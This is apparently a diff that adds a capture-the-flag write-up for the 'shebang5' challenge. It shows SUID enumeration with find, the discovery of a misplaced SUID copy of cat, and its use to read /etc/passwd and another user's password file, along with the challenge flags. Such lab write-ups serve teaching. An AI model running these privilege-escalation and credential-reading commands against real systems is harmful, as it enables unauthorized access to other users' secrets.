@@ -269,3 +269,96 @@ Viewing the image showed the flag:
 ![flag4](./flag_shebang4.png)
 
 So the flag for shebang4 is: `CYCTF{W3ll_1_gu3$$_th@t_w@s_actually_easy}`.
+
+## shebang5
+Author: stephencurry396 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Points: 250
+
+### Problem description
+there is a very bad file on this Server. can yoU fInD it.
+
+### Concepts
+* [setuid](https://en.wikipedia.org/wiki/Setuid)
+
+### Solution
+Connected via ssh as user shebang5.
+
+Listing current directory contents showed only the empty file .hushlogin.
+
+```
+$ ls -al
+total 12
+dr-x------ 1 shebang5 root 4096 Oct 31 01:01 .
+drwxr-xr-x 1 root     root 4096 Oct 31 00:49 ..
+-rw-r--r-- 1 root     root    0 Oct 31 01:01 .hushlogin
+```
+
+Actually, the capitalization in the problem description (UID) suggests that
+maybe we need to look for a file with the `SUID` permission set.
+
+As stated in the wikipedia entry on [setuid](https://en.wikipedia.org/wiki/Setuid):
+
+> The Unix access rights flags setuid and setgid (short for "set user ID" and
+"set group ID") allow users to run an executable with the file system permissions
+of the executable's owner or group respectively and to change behaviour in directories.
+They are often used to allow users on a computer system to run programs with
+temporarily elevated privileges in order to perform a specific task.
+
+Used the `find` command to look for a file with such permissions:
+```
+$ find / -perm /u=s,g=s 2>/dev/null
+/var/mail
+/var/local
+/var/cat
+/usr/sbin/unix_chkpwd
+/usr/sbin/pam_extrausers_chkpwd
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/wall
+/usr/bin/chage
+/usr/bin/chsh
+(...)
+```
+
+The `/var/cat` file stood out, as `cat` is usually located in the `/usr/bin`
+directory, without the `SUID` permission set.
+
+Executing the file to check that it behaves as the regular `cat` program:
+```
+$ /var/cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+(...)
+```
+
+Examining the file attributes with `ls`, we can see that the owner of `/var/cat`
+is `shebang6`:
+```
+$ ls -al /var/cat
+---s--x--x 1 shebang6 root 16992 Oct 14 20:51 /var/cat
+```
+
+Now we can use the `find` command to look for files owned by `shebang6`:
+```
+$ find / -user shebang6 2>/dev/null
+/var/cat
+/etc/passwords/shebang6
+```
+
+The file `/etc/passwords/shebang6` looked promising, so tried to output its
+content with `/var/cat`:
+
+```
+$ /var/cat /etc/passwords/shebang6
+CYCTF{W3ll_1_gu3$$_SU1D_1$_e@$y_fl@g$}
+```
+
+Thus, the flag for shebang5 is `CYCTF{W3ll_1_gu3$$_SU1D_1$_e@$y_fl@g$}`.
